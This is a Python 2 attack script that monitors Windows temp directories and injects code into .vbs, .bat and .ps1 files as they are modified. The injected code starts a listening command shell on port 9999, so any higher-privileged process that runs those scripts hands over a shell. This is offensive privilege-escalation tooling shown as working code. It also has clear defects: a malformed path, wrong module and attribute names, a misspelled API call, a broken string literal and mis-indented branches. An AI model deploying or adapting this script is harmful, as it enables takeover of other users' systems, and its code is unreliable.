import tempfile
import threading
import win32file
import win32con
import os

dirsToMonitor = ["C\\WINDOWS\\Temp]", tempfile.gettempdir()]
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

fileTypes = {}
command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
fileTypes['.vbs'] = ["\r\n'marker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
fileTypes['.bat'] = ["\r\nREM marker\r\n", "\r\n%s
\r\n" % command]
fileTypes['.ps1'] = ["\r\n#marker", "Start-Process \"%s\"" % command]


def injectCode(fullFileName, extension, contents):
    if fileTypes[extension][0] in contents:
        return

    fullContents = fileTypes[extension][0]
    fullContents += fileTypes[extension][1]
    fullContents += contents

    fd = open(fullFileName, "wb")
    fd.write(fullContents)
    fd.close()

    print "[\o/] Injected code."

    return

def startMonitor(pathToWatch):
    FILE_LIST_DIRECTORY = 0x0001

    hDirectory = win32file.CreateFile(
        pathToWatch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ |
        win32.FILE_SHARE_WRITE |
        win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG.BACKUP_SEMANTICS,
        None)

    while True:
        try:
            results = win32file.ReadDirectoryChangeW(
                hDirectory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )

            for action, fileName in results:
                fullFileName = os.path.join(pathToWatch, fileName)
                if action == FILE_CREATED:
                    print "[ + ] Created %s" % fullFileName
                elif action == FILE_DELETED:
                    print "[ - ] Deleted %s" % fullFileName
                elif action == FILE_MODIFIED:
                    print "[ * ] Modified %s" % fullFileName
                    print "[vvv] Dumping contents..."
                    try:
                        fd = open(fullFileName, "rb")
                        contents = fd.read()
                        fd.close()
                        print contents
                        print "[^^^] Dump complete."
                    except:
                        print "[!!!] Failed."

                    fileName, extension = os.path.splitext(fullFileName)

                    if extension in fileTypes:
                        injectCode(fullFileName, extension, contents)

                    elif action == FILE_RENAMED_FROM:
                        print "[ > ] Renamed from: %s" % fullFileName
                    elif action == FILE_RENAMED_TO:
                        print "[ < ] Renamed to: %s" % fullFileName
                    else:
                        print "[???] Unkown: %s" % fullFileName
        except:
            pass

for path in dirsToMonitor:
    monitorThread = threading.Thread(target=startMonitor, args=(path,))
    print "Spawning monitoring thread for path: %s" % path
    monitorThread.start()

